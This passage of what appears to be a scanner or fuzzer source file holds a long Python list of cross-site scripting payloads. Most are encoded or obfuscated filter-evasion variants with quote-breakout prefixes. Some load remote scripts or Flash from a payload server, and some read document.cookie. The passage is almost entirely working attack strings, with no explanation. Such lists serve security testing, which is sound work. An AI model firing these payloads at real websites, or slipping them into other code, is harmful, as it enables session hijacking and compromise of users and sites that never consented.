             '"></script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror=\'eval(src)\'>',
             '\'></script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror=\'eval(src)\'>',
             '<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>', '"><img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>',
             "'><img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>",
             '<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>',
             '"><form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>',
             '\'><form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>',
             '<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&#09;&#10;&#11;>X</a',
             '"><a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&#09;&#10;&#11;>X</a',
             '\'><a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="&#09;&#10;&#11;>X</a',
             'http://www.keralacyberforce<script .in>alert(document.location)</script',
             '<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a',
             '"><a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a',
             '\'><a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a',
             "<img/src=@&#32;&#13; onerror = prompt('&#49;')", '"><img/src=@&#32;&#13; onerror = prompt(\'&#49;\')',
             "'><img/src=@&#32;&#13; onerror = prompt('&#49;')", "<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;",
             '"><style/onload=prompt&#40;\'&#88;&#83;&#83;\'&#41;', "'><style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;",
             '<script ^__^>alert(String.fromCharCode(49))</script ^__^',
             '"><script ^__^>alert(String.fromCharCode(49))</script ^__^',
             "'><script ^__^>alert(String.fromCharCode(49))</script ^__^",
             '</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(',
             '"></style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(',
             "'></style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(",
             '&#00;</form><input type&#61;"date" onfocus="alert(1)">',
             "<form><textarea &#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;'>",
             '"><form><textarea &#13; onkeyup=\'\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;\'>',
             "'><form><textarea &#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;'>",
             "<script /***/>/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/</script /***/",
             '"><script /***/>/***/confirm(\'\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450\')/***/</script /***/',
             "'><script /***/>/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/</script /***/",
             "<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>",
             '"><iframe srcdoc=\'&lt;body onload=prompt&lpar;1&rpar;&gt;\'>',
             "'><iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>",
             '<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',
             '"><a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',
             '\'><a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',
             '<script ~~~>alert(0%0)</script ~~~>', '"><script ~~~>alert(0%0)</script ~~~>',
             "'><script ~~~>alert(0%0)</script ~~~>", '<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>',
             '"><style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>',
             "'><style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>",
             "<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN",
             '"><///style///><span %2F onmousemove=\'alert&lpar;1&rpar;\'>SPAN',
             "'><///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN",
             "<img/src='http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg' onmouseover=&Tab;prompt(1)",
             '"><img/src=\'http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg\' onmouseover=&Tab;prompt(1)',
             "'><img/src='http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg' onmouseover=&Tab;prompt(1)",
             "&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'",
             '&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}',
             "<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^",
             '"><marquee onstart=\'javascript:alert&#x28;1&#x29;\'>^__^',
             "'><marquee onstart='javascript:alert&#x28;1&#x29;'>^__^",
             '<div/style="width:expression(confirm(1))">X</div>', '"><div/style="width:expression(confirm(1))">X</div>',
             '\'><div/style="width:expression(confirm(1))">X</div> {IE7}',
             '"><div/style="width:expression(confirm(1))">X</div>',
             '"><div/style="width:expression(confirm(1))">X</div>',
             '\'><div/style="width:expression(confirm(1))">X</div> {IE7}',
             '\'><div/style="width:expression(confirm(1))">X</div>',
             '"><div/style="width:expression(confirm(1))">X</div>',
             '\'><div/style="width:expression(confirm(1))">X</div> {IE7}', '<iframe/%00/ src=javaSCRIPT&colon;alert(1)',
             '"><iframe/%00/ src=javaSCRIPT&colon;alert(1)', "'><iframe/%00/ src=javaSCRIPT&colon;alert(1)",
             "//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//",
             '/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>',
             "//|\\\\ <script //|\\\\ src='http://127.0.0.1:3555/xss_serve_payloads/X.js'> //|\\\\ </script //|\\\\",
             "//|\\\\ <script //|\\\\ src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'> //|\\\\ </script //|\\\\",
             "</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>",
             '"></font>/<svg><style>{src&#x3A;\'<style/onload=this.onload=confirm(1)>\'</font>/</style>',
             "'></font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>",
             '<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">',
             '"><a/href="javascript:&#13; javascript:prompt(1)"><input type="X">',
             '\'><a/href="javascript:&#13; javascript:prompt(1)"><input type="X">',
             '</plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
             '"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)',
             "'></plaintext\\></|\\><plaintext/onmouseover=prompt(1)",
             "</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29;",
             '"></svg>\'\'<svg><script \'AQuickBrownFoxJumpsOverTheLazyDog\'>alert&#x28;1&#x29;',
             "'></svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29;",
             '<a href="javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>',
             '"><a href="javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>',
             '\'><a href="javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>',
             "<div onmouseover='alert&lpar;1&rpar;'>DIV</div>", '"><div onmouseover=\'alert&lpar;1&rpar;\'>DIV</div>',
             "'><div onmouseover='alert&lpar;1&rpar;'>DIV</div>",
             '<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">',
             '"><iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">',
             '\'><iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">',
             '<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>',
             '"><a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>',
             '\'><a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>',
             '<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>X</a>',
             '"><a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>X</a>',
             "'><a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>X</a>",
             '<img src="/" =_=" title="onerror=\'prompt(1)\'">', '"><img src="/" =_=" title="onerror=\'prompt(1)\'">',
             '\'><img src="/" =_=" title="onerror=\'prompt(1)\'">', "<%<!--'%><script>alert(1);</script -->",
             '"><%<!--\'%><script>alert(1);</script -->', "'><%<!--'%><script>alert(1);</script -->",
             '<script src="data:text/javascript,alert(1)"></script>',
             '"><script src="data:text/javascript,alert(1)"></script>',
             '\'><script src="data:text/javascript,alert(1)"></script>', '<iframe/src \\/\\/onload = prompt(1)',
             '"><iframe/src \\/\\/onload = prompt(1)', "'><iframe/src \\/\\/onload = prompt(1)",
             '<iframe/onreadystatechange=alert(1)', '"><iframe/onreadystatechange=alert(1)',
             "'><iframe/onreadystatechange=alert(1)", '<svg/onload=alert(1)', '"><svg/onload=alert(1)',
             "'><svg/onload=alert(1)", '<input value=<><iframe/src=javascript:confirm(1)',
             '"><input value=<><iframe/src=javascript:confirm(1)', "'><input value=<><iframe/src=javascript:confirm(1)",
             '<input type="text" value=`` <div/onmouseover=\'alert(1)\'>X</div>',
             '"><input type="text" value=`` <div/onmouseover=\'alert(1)\'>X</div>',
             '\'><input type="text" value=`` <div/onmouseover=\'alert(1)\'>X</div>',
             'http://www.<script>alert(1)</script .com',
             '<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>',
             '"><iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>',
             "'><iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>",
             '<svg><script ?>alert(1)', '"><svg><script ?>alert(1)', "'><svg><script ?>alert(1)",
             '<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>',
             '"><iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>',
             "'><iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
             '<img src=`xx:xx`onerror=alert(1)>', '"><img src=`xx:xx`onerror=alert(1)>',
             "'><img src=`xx:xx`onerror=alert(1)>",
             '<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '"><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '\'><meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>',
             '<math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">X',
             '"><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">X',
             '\'><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">X',
             '<math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/bmpz.bmp">X',
             '"><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/bmpz.bmp">X',
             '\'><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/bmpz.bmp">X',
             '<embed code="http://127.0.0.1:3555/xss_serve_payloads/X.swf" allowscriptaccess=always>',
             '"><embed code="http://127.0.0.1:3555/xss_serve_payloads/X.swf" allowscriptaccess=always>',
             '\'><embed code="http://127.0.0.1:3555/xss_serve_payloads/X.swf" allowscriptaccess=always>',
             '<svg contentScriptType=text/vbs><script>MsgBox+1', '"><svg contentScriptType=text/vbs><script>MsgBox+1',
             "'><svg contentScriptType=text/vbs><script>MsgBox+1",
             '<a href="data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>">X</a',
             '"><a href="data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>">X</a',
             '\'><a href="data:text/html;base64_,<svg/onload=\\u0061&#x6C;&#101%72t(1)>">X</a',
             "<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>",
             '"><iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(\'\\u0061\') worksinIE>',
             "'><iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE>",
             "<script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             "</ScrIpt><script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             '"><script>~\'\\u0061\' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~\'\\u0061\')</script U+',
             "</ScrIpt><script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             "'><script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             "</ScrIpt><script>~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')</script U+",
             '<script/src="data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(\'\\u0061\')"></script a=\\u0061 & /=%2F',
             '"><script/src="data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(\'\\u0061\')"></script a=\\u0061 & /=%2F',
             '\'><script/src="data&colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(\'\\u0061\')"></script a=\\u0061 & /=%2F',
             '<script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             '"><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script',
             "'><script/src=data&colon;text/j\\u0061v\\u0061&#115&#99&#114&#105&#112&#116,\\u0061%6C%65%72%74(/X/)></script",
             '<object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>',
             '"><object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>',
             "'><object data=javascript&colon;\\u0061&#x6C;&#101%72t(1)>", '<script>+-+-1-+-+alert(1)</script>',
             '</ScrIpt><script>+-+-1-+-+alert(1)</script>', '"><script>+-+-1-+-+alert(1)</script>',
             '</ScrIpt><script>+-+-1-+-+alert(1)</script>', "'><script>+-+-1-+-+alert(1)</script>",
             '</ScrIpt><script>+-+-1-+-+alert(1)</script>', '<body/onload=&lt;!--&gt;&#10alert(1)>',
             '"><body/onload=&lt;!--&gt;&#10alert(1)>', "'><body/onload=&lt;!--&gt;&#10alert(1)>",
             '<script allbrowserX>/*<script* */alert(1)</script', '"><script allbrowserX>/*<script* */alert(1)</script',
             "'><script allbrowserX>/*<script* */alert(1)</script", '<img src ?X?\\/onerror = alert(1)',
             '"><img src ?X?\\/onerror = alert(1)', "'><img src ?X?\\/onerror = alert(1)",
             '<svg><script>//&NewLine;confirm(1);</script </svg>',
             '"><svg><script>//&NewLine;confirm(1);</script </svg>',
             "'><svg><script>//&NewLine;confirm(1);</script </svg>", '<svg><script onlypossibleinopera:-)> alert(1)',
             '"><svg><script onlypossibleinopera:-)> alert(1)', "'><svg><script onlypossibleinopera:-)> alert(1)",
             '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>X',
             '"><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>X',
             "'><a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>X",
             '<script x> alert(1) </script 1=2', '"><script x> alert(1) </script 1=2',
             "'><script x> alert(1) </script 1=2", '<div/onmouseover=\'alert(1)\'> style="x:">',
             '"><div/onmouseover=\'alert(1)\'> style="x:">', '\'><div/onmouseover=\'alert(1)\'> style="x:">',
             '<--`<img/src=` onerror=alert(1)> --!>', '"><--`<img/src=` onerror=alert(1)> --!>',
             "'><--`<img/src=` onerror=alert(1)> --!>",
             '<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             '"><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>',
             "'><script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",
             '<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>',
             '"><div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>',
             '\'><div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>',
             "<img src=x onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html');>",
             '"><img src=x onerror=window.open(\'http://127.0.0.1:3555/xss_serve_payloads/X.html\');>',
             "'><img src=x onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html');>",
             '<form><button formaction=javascript&colon;alert(1)>X',
             '"><form><button formaction=javascript&colon;alert(1)>X',
             "'><form><button formaction=javascript&colon;alert(1)>X",
             '<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>',
             '"><iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>',
             '\'><iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>',
             '<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">X</a>',
             '"><a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">X</a>',
             '\'><a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">X</a>',
             '<sVg><scRipt %00>prompt&lpar;/', '"><sVg><scRipt %00>prompt&lpar;/', "'><sVg><scRipt %00>prompt&lpar;/",
             "w=window.open('invalidfileinvalidfileinvalidfile','target');setTimeout('alert(w.document.location);w.close();',1);",
             'try%7Balert(1)%7Dcatch(e)%7Blocation.reload()%7D',
             '<div id="alert(\'/X/\')" style="x:expression(eval)(id)">',
             '"><div id="alert(\'/X/\')" style="x:expression(eval)(id)">',
             '\'><div id="alert(\'/X/\')" style="x:expression(eval)(id)">', '0\\%22))}catch(e){alert(1)}//',
             '<img language=vbs src=<b onerror=alert#1/1#>', '"><img language=vbs src=<b onerror=alert#1/1#>',
             "'><img language=vbs src=<b onerror=alert#1/1#>", "<script>alert(1)/X/'</script>",
             "</ScrIpt><script>alert(1)/X/'</script>", '"><script>alert(1)/X/\'</script>',
             "</ScrIpt><script>alert(1)/X/'</script>", "'><script>alert(1)/X/'</script>",
             "</ScrIpt><script>alert(1)/X/'</script>", "<script>alert(1)<!-- '</script>",
             "</ScrIpt><script>alert(1)<!-- '</script>", '"><script>alert(1)<!-- \'</script>',
             "</ScrIpt><script>alert(1)<!-- '</script>", "'><script>alert(1)<!-- '</script>",
             "</ScrIpt><script>alert(1)<!-- '</script>", '<script> var a = "X"; alert(1); </script>',
             '</ScrIpt><script> var a = "X"; alert(1); </script>', '"><script> var a = "X"; alert(1); </script>',
             '</ScrIpt><script> var a = "X"; alert(1); </script>', '\'><script> var a = "X"; alert(1); </script>',
             '</ScrIpt><script> var a = "X"; alert(1); </script>', "<script> var a=1'; alert(1); </script>",
             "</ScrIpt><script> var a=1'; alert(1); </script>", '"><script> var a=1\'; alert(1); </script>',
             "</ScrIpt><script> var a=1'; alert(1); </script>", "'><script> var a=1'; alert(1); </script>",
             "</ScrIpt><script> var a=1'; alert(1); </script>", '<script> var x = "X\\"; alert(1); </script>',
             '</ScrIpt><script> var x = "X\\"; alert(1); </script>', '"><script> var x = "X\\"; alert(1); </script>',
             '</ScrIpt><script> var x = "X\\"; alert(1); </script>', '\'><script> var x = "X\\"; alert(1); </script>',
             '</ScrIpt><script> var x = "X\\"; alert(1); </script>', '<img src="1" onerror="alert(1)">',
             '"><img src="1" onerror="alert(1)">', '\'><img src="1" onerror="alert(1)">',
             '<img src="" onload=alert(1)>', '"><img src="" onload=alert(1)>', '\'><img src="" onload=alert(1)>',
             '<script> function a() {} </script> <img src=1 onerror="a();alert(1)">',
             '</ScrIpt><script> function a() {} </script> <img src=1 onerror="a();alert(1)">',
             '"><script> function a() {} </script> <img src=1 onerror="a();alert(1)">',
             '</ScrIpt><script> function a() {} </script> <img src=1 onerror="a();alert(1)">',
             '\'><script> function a() {} </script> <img src=1 onerror="a();alert(1)">',
             '</ScrIpt><script> function a() {} </script> <img src=1 onerror="a();alert(1)">',
             '<img src=1 onerror="alert(1)">', '"><img src=1 onerror="alert(1)">', '\'><img src=1 onerror="alert(1)">',
             '<img src=1 onerror"alert(1)">', '"><img src=1 onerror"alert(1)">', '\'><img src=1 onerror"alert(1)">',
             '<svg><script>lo<sv>gChr(1)</script></svg>', '"><svg><script>lo<sv>gChr(1)</script></svg>',
             "'><svg><script>lo<sv>gChr(1)</script></svg>", '<img src=# aaa;onerror="alert(1)">',
             '"><img src=# aaa;onerror="alert(1)">', '\'><img src=# aaa;onerror="alert(1)">',
             '<a href=x onerror=alert(1)>', '"><a href=x onerror=alert(1)>', "'><a href=x onerror=alert(1)>",
             '<script> var x = "asdf\\1 asdf"; alert(1); </script>',
             '</ScrIpt><script> var x = "asdf\\1 asdf"; alert(1); </script>',
             '"><script> var x = "asdf\\1 asdf"; alert(1); </script>',
             '</ScrIpt><script> var x = "asdf\\1 asdf"; alert(1); </script>',
             '\'><script> var x = "asdf\\1 asdf"; alert(1); </script>',
             '</ScrIpt><script> var x = "asdf\\1 asdf"; alert(1); </script>', '<img src=xx:xx;onerror=alert(1)>',
